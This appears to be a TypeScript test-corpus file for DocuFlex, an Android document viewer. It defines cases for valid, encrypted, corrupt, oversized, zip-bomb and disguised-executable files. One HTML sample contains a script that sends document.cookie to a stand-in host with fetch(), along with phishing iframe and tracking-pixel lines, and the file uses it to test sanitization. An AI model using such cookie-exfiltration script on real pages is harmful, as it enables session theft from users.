export interface TestCase {
  id: string;
  name: string;
  category: 'PDF' | 'IMAGE' | 'TEXT' | 'CSV' | 'HTML' | 'OFFICE' | 'MALICIOUS' | 'ANOMALY';
  description: string;
  expectedOutcome: 'RENDER_SUCCESS' | 'REJECT_SECURITY' | 'FALLBACK_EXTERNAL' | 'REJECT_OOM' | 'CORRUPT_ERROR';
  expectedBadge: string;
  fileData: {
    name: string;
    type: string;
    size: number;
    textSample?: string;
    isEncrypted?: boolean;
    isCorrupt?: boolean;
    isMalicious?: boolean;
    isZipBomb?: boolean;
    isOversized?: boolean;
  };
}

export const TEST_CORPUS_SUITE: TestCase[] = [
  {
    id: 'test-valid-pdf',
    name: 'Standard Multipage PDF',
    category: 'PDF',
    description: 'Clean PDF with standard %PDF-1.7 header. Verifies page-by-page rendering and bitmap memory recycling.',
    expectedOutcome: 'RENDER_SUCCESS',
    expectedBadge: 'Render Pass',
    fileData: {
      name: 'Android_Architecture_Guide.pdf',
      type: 'application/pdf',
      size: 142_500,
      textSample: '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n...'
    }
  },
  {
    id: 'test-encrypted-pdf',
    name: 'Encrypted / Password-Protected PDF',
    category: 'PDF',
    description: 'PDF containing /Encrypt trailer dictionary. Native platform PdfRenderer cannot decrypt this; app intercepts and delegates to external viewer safely.',
    expectedOutcome: 'FALLBACK_EXTERNAL',
    expectedBadge: 'Safe Fallback',
    fileData: {
      name: 'Confidential_Financials_Encrypted.pdf',
      type: 'application/pdf',
      size: 98_400,
      isEncrypted: true,
      textSample: '%PDF-1.7\n<< /Encrypt 4 0 R /Filter /Standard /V 4 /R 4 /P -1052 >>'
    }
  },
  {
    id: 'test-corrupt-pdf',
    name: 'Truncated / Corrupted PDF Header',
    category: 'PDF',
    description: 'Malformed document lacking standard PDF magic bytes. SafValidator rejects immediately to prevent renderer crashes.',
    expectedOutcome: 'CORRUPT_ERROR',
    expectedBadge: 'Intercepted',
    fileData: {
      name: 'Damaged_Transfer_Dump.pdf',
      type: 'application/pdf',
      size: 12_400,
      isCorrupt: true,
      textSample: 'RANDOM_CORRUPT_BYTES_4590329042_INVALID_MAGIC'
    }
  },
  {
    id: 'test-valid-csv',
    name: 'Enterprise Expense Ledger CSV',
    category: 'CSV',
    description: 'Multi-column CSV with commas inside quoted fields. Parsed with row & column limits (RFC 4180 streaming table).',
    expectedOutcome: 'RENDER_SUCCESS',
    expectedBadge: 'Render Pass',
    fileData: {
      name: 'Q3_Global_Audit_Ledger.csv',
      type: 'text/csv',
      size: 3_450,
      textSample: `ID,Date,Dept,Vendor,Item Description,Amount,Currency,Status
TX-801,2026-09-01,Engineering,JetBrains,"Kotlin Multiplatform Enterprise License, Team Pack",3200.00,USD,Approved
TX-802,2026-09-02,DevOps,Canonical,"Ubuntu Pro Support, Tier 3",1450.00,USD,Approved
TX-803,2026-09-05,Security,Trail of Bits,"Independent Mobile Cryptographic Audit, Milestone 1",12500.00,USD,Verified
TX-804,2026-09-12,Product,Figma,"Organization Design Seats, Annual",2400.00,USD,Approved
TX-805,2026-09-18,QA,Firebase Test Lab,"Automated Real Device Farm Matrix, 500 hrs",890.50,USD,Settled`
    }
  },
  {
    id: 'test-valid-txt',
    name: 'UTF-8 Source Release Notes',
    category: 'TEXT',
    description: 'Clean UTF-8 text with multi-byte unicode characters (हिन्दी, 日本語, etc.) and line-capping safety.',
    expectedOutcome: 'RENDER_SUCCESS',
    expectedBadge: 'Render Pass',
    fileData: {
      name: 'RELEASE_NOTES_v1.0.txt',
      type: 'text/plain',
      size: 1_820,
      textSample: `=====================================================
DocuFlex — Privacy-First Document Viewer v1.0.0
Build: Production Release (Android 14 / TargetSDK 34)
=====================================================

Key Principles:
1. Zero Network Access (No android.permission.INTERNET).
2. Strict Storage Access Framework (SAF) integration.
3. No tracking, telemetry, accounts, or background workers.
4. WindowManager.FLAG_SECURE screenshot prevention.
5. BiometricPrompt authentication.

Supported Internal Formats:
- PDF (Single page bitmap recycling)
- TXT, CSV (RFC 4180 compliant)
- PNG, JPEG, WEBP (Downsampled via inSampleSize)
- HTML (Sanitized, JavaScript & network blocked)

Office Documents:
DOCX/XLSX/PPTX fall back safely to compatible external viewers.`
    }
  },
  {
    id: 'test-valid-image',
    name: 'High-Resolution Architecture Diagram',
    category: 'IMAGE',
    description: 'High-resolution PNG diagram. Decoded safely with memory subsampling (inSampleSize) to prevent OOM.',
    expectedOutcome: 'RENDER_SUCCESS',
    expectedBadge: 'Render Pass',
    fileData: {
      name: 'DocuFlex_Modular_Architecture.png',
      type: 'image/png',
      size: 320_000,
      textSample: 'PNG_IMAGE_SAMPLE_DATA'
    }
  },
  {
    id: 'test-malicious-html',
    name: 'Untrusted HTML with XSS & Remote Trackers',
    category: 'HTML',
    description: 'Contains <script> tags, onload XSS, <iframe>, and remote tracking pixels. SafeHtmlEngine strips all executable script tags and blocks remote fetches.',
    expectedOutcome: 'RENDER_SUCCESS',
    expectedBadge: 'Threats Neutralized',
    fileData: {
      name: 'Invoice_Preview_Untrusted.html',
      type: 'text/html',
      size: 2_950,
      isMalicious: true,
      textSample: `<!DOCTYPE html>
<html>
<head>
  <title>Urgent Invoice Notice #9821</title>
  <script>
    fetch('https://malicious-telemetry.example/exfiltrate?cookie=' + document.cookie);
  </script>
</head>
<body onload="window.exploitTrigger()">
  <h2>Payment Authorization Required</h2>
  <p>Amount Due: $1,450.00 USD</p>
  <iframe src="https://phishing-site.example/steal-credentials"></iframe>
  <img src="https://tracking-pixel.example/beacon.gif" width="1" height="1" />
  <p>DocuFlex sanitizes this document and displays safe plain text layout.</p>
</body>
</html>`
    }
  },
  {
    id: 'test-zip-bomb',
    name: 'Zip-Bomb / Anomalous Expansion Ratio',
    category: 'ANOMALY',
    description: 'Archive with extreme compression ratio (> 100:1) and suspicious nested depth (simulating 42.zip). Intercepted by ZipSecurityValidator.',
    expectedOutcome: 'REJECT_SECURITY',
    expectedBadge: 'Blocked (Ratio)',
    fileData: {
      name: 'Nested_Archive_Suspicious.docx',
      type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      size: 15_200,
      isZipBomb: true,
      textSample: 'PK\x03\x04_SIMULATED_RECURSIVE_EXPANSION_ANOMALY'
    }
  },
  {
    id: 'test-mismatched-exe',
    name: 'Executable Camouflaged as PDF (MZ Header)',
    category: 'MALICIOUS',
    description: 'Windows/DOS binary executable containing "MZ" header disguised with a .pdf extension. MagicBytesDetector rejects immediately.',
    expectedOutcome: 'REJECT_SECURITY',
    expectedBadge: 'Signature Blocked',
    fileData: {
      name: 'Salary_Slip_Disguised_Trojan.pdf',
      type: 'application/pdf',
      size: 45_000,
      isCorrupt: true,
      textSample: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00This program cannot be run in DOS mode.'
    }
  },
  {
    id: 'test-oversized-file',
    name: 'Oversized Document (Exceeds 50 MB)',
    category: 'ANOMALY',
    description: 'File size exceeds the 50 MB safe offline memory threshold. Safeguards device against sudden OutOfMemory terminations.',
    expectedOutcome: 'REJECT_OOM',
    expectedBadge: 'Memory Cap',
    fileData: {
      name: 'Uncompressed_Raw_Data_Dump.txt',
      type: 'text/plain',
      size: 58 * 1024 * 1024,
      isOversized: true,
      textSample: 'OVERSIZED_PAYLOAD'
    }
  }
];
